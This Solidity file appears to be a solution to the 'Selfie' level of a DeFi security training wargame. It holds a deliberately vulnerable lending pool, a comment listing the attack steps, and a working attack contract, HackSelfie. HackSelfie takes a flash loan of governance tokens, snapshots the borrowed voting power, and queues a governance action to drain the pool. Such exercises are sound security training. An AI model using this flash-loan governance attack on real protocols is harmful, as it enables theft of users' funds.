pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

contract SelfiePool is ReentrancyGuard {

    using Address for address payable;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) public {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        (bool success,) = msg.sender.call(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        require(success, "External call failed");

        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    /**+-In Order to Attack this S.C. Draining ALL its Funds is to call this Function
    "drainAllFunds(address receiver)":_
    -(1)-Get a FlashLoan of > Than the Half of the Governance Tokens T.S..
    -(2)-Take a SnapShot of the Funds of Our Wallet.
    -(3)-Then immediately Call "queueAction(***)" from the "SimpleGovernance" S.C. to
    Drain all the Funds from THIS S.C..
    -(4)-After 2 Days, we Call "executeAction(***)" from the "SimpleGovernance" S.C. and
    actually Drain All the Tokens from the LendingPool S.C..
    .*/
    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

import "../DamnValuableTokenSnapshot.sol";


contract HackSelfie {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public gov;

    uint public actionId;

    constructor(address _token, address _pool, address _gov) public {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }

    fallback() external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));

        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    function attack2() external {
        gov.executeAction(actionId);
    }
}